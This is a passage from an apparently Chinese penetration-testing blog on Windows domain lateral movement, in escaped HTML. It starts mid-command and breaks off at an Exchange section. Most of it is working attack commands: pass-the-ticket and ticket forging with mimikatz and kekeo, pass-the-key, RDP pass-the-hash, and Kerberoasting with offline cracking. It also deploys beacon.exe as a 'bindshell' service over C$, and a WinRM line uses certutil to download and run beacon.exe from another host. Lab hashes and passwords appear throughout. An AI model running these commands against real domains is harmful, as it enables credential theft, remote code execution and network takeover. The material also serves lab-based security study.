-u webadmin@god.org -s S-1-5-21-121 8902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;清除票据连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell klist purge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;内存导入票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::ptc TGT_webadmin@god.org.ccache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell klist&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接目标上线&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell dir \\OWA2010CN-GOD\c$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell net use \\OWA2010CN-GOD\C$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy beacon.exe \\OWA2010CN-GOD\C$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc \\OWA2010CN-GOD create bindshell binpath= &amp;quot;c:\beacon.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc \\OWA2010CN-GOD start bindshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注意：成功不成功看DC域控漏洞补丁打没打&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 2 ）kekeo (高权限，需 NTLM)&lt;br&gt;
 当前主机肯定之前与其他主机连接过，所以本地会生成了一些票据，可以&lt;br&gt;
导出这些票据，然后再导入票据进行利用。该方法类似于 cookie 欺骗。但是票 据是有有效期的，当前主机在连接过域控的话，有效期内可利用。即利用获取 的 NTLM 生成新的票据尝试认证。工具比较小的话可以上传到肉鸡，如果比较 大，还是需要通过 socket 代理。&lt;/p&gt;
&lt;p&gt;通过横向到其他主机尽可能获得到比较多的 hash 值进行测试：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell kekeo &amp;quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&amp;quot; &amp;quot;exit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导入票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell kekeo &amp;quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&amp;quot; &amp;quot;exit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell klist&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用票据连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell dir \\owa2010cn-god\c$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注意：成功不成功看ntlm哈希值的正确性&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 3 ）mimikatz (高权限，需 Ticket)&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用历史遗留的票据重新认证尝试&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导出票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz sekurlsa::tickets /export&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导入票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::ptt C:\Users\webadmin\Desktop\22d3a-2-1-40e00000-Administrator@krbtgt-god.org.kirbi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看票据：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell klist&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用票据连接：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell dir \\owa2010cn-god\c$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注意：成功不成功看当前主机有没有被目标连接过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ptk-密钥传递攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ptk-密钥传递攻击&#34;&gt;#&lt;/a&gt; PTK 密钥传递攻击&lt;/h4&gt;
&lt;p&gt;PTK (pass the key)：密钥传递攻击，利用的 ekeys aes256 进行的渗透测试（NTLM 认证攻击）&lt;/p&gt;
&lt;p&gt;PTK = Pass The Key，当系统安装了 KB2871997 补丁且禁用了 NTLM 的 时候，那我们抓取到的 ntlm hash 也就失去了作用，但是可以通过 PTK 的攻击 方式获得权限。这个方式利用条件比较苛刻，算的上是比较鸡肋的，一般很难 被利用到。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mimikatz sekurlsa::ekeys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;rdp-横向渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rdp-横向渗透&#34;&gt;#&lt;/a&gt; RDP 横向渗透&lt;/h4&gt;
&lt;p&gt;做了提权之后，进行一波 3389 端口扫描，一般配合创建新的用户，从跳板 机创建代理节点从本地接入肉鸡，需要注意的是，如果自己登陆的用户名与对 方的用户名一致，对方用户会被迫下线，反之不会。远程桌面服务支持明文及 HASH 连接。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;探针服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;cs 内置端口扫描 3389&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tasklist /svc | find &amp;quot;TermService&amp;quot; # 找到对应服务进程的PID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -ano | find &amp;quot;PID值&amp;quot; # 找到进程对应的端口号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;探针连接 CrackMapExec&amp;amp;MSF 批扫用户名密码验证&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;明文连接：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mstsc /console /v:192.168.3.32 /admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;HASH连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c &amp;quot;/run:mstsc /restrictedadmin&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;winrm-横向渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#winrm-横向渗透&#34;&gt;#&lt;/a&gt; WinRM 横向渗透&lt;/h4&gt;
&lt;p&gt;WinRM 代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务 的服务。默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。需要 攻击机和受害机双方都启用的 Winrm rs 的服务。并且使用此服务需要管理员级 别凭据。&lt;/p&gt;
&lt;p&gt;Windows 2008 以上版本默认自动状态，Windows Vista/win7 上必须手动启 动；Windows 2012 之后的版本默认允许远程任意主机来管理。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击机开启：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;winrm quickconfig -q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;winrm set winrm/config/Client @&amp;#123;TrustedHosts=&amp;quot;*&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;探针可用：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cs 内置端口扫描 5985&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell Get-WmiObject -Class win32_service | Where-Object &amp;#123;$_.name -like &amp;quot;WinRM&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上线CS&amp;amp;MSF:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &amp;quot;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/beacon.exe](http://192.168.3.31/beacon.exe) beacon.exe &amp;amp; beacon.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;spn-kerberos-攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#spn-kerberos-攻击&#34;&gt;#&lt;/a&gt; SPN Kerberos 攻击&lt;/h4&gt;
&lt;p&gt;在无法通过 mimikaza 获取到 hash 或者明文的时候，可以采用通过 kerberos 获取凭证中隐藏的具体密码。通过 spn 先扫描电脑上存在的服务列表，在针对服务进行利用。&lt;/p&gt;
&lt;p&gt;（ 1 ）Kerberoasting 攻击的利用&lt;/p&gt;
&lt;p&gt;SPN 服务发现、请求服务票据、服务票据的导出、服务票据的暴力破解&lt;/p&gt;
&lt;p&gt;（ 2 ）项目地址推荐&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9SdWJldXM=&#34;&gt;https://github.com/GhostPack/Rubeus&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL25pZGVtL2tlcmJlcm9hc3Q=&#34;&gt;https://github.com/nidem/kerberoast&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3NDk2Ny5odG1s&#34;&gt;https://www.freebuf.com/articles/system/174967.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 3 ）如需利用需要配置策略加密方式&lt;/p&gt;
&lt;p&gt;黑客可以使用有效的域用户的身份验证票证 (TGT) 去请求运行在服务器上的一个或多个目标服务的服务票证。DC 在活动目录中查找 SPN，并使用与 S PN 关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。&lt;/p&gt;
&lt;p&gt;请求的 Kerberos 服务票证的加密类型是 RC4_HMAC_MD5，这意味着服务 帐户的 NTLM 密码哈希用于加密服务票证。黑客将收到的 TGS 票据离线进行破 解，即可得到目标服务帐号的 HASH，这个称之为 Kerberoast 攻击。&lt;/p&gt;
&lt;p&gt;如果我们有一个为域用户帐户注册的任意 SPN，那么该用户帐户的明文密 码的 NTLM 哈希值就将用于创建服务票证。&lt;/p&gt;
&lt;p&gt;（ 4 ）Kerberos 攻击条件&lt;/p&gt;
&lt;p&gt;采用 rc4 加密类型票据，工具 Rubeus 检测或看票据加密类型&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Kerberos 攻击流程&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;spn扫描&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell setspn -T 0day.org -q */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell setspn -T 0day.org -q */* | findstr &amp;quot;MSSQL&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;工具检测&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Rubeus kerberoast&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;手工请求：（要产生票据文件）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell Add-Type -AssemblyName System.IdentityModel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos:list&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::list /export&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;破解&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python tgsrepcrack.py pass.txt &amp;quot;1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;exchange-攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exchange-攻击&#34;&gt;#&lt;/a&gt; Exchange 攻击&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Exchange 探针&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（ 1 ）端口扫描&lt;br&gt;
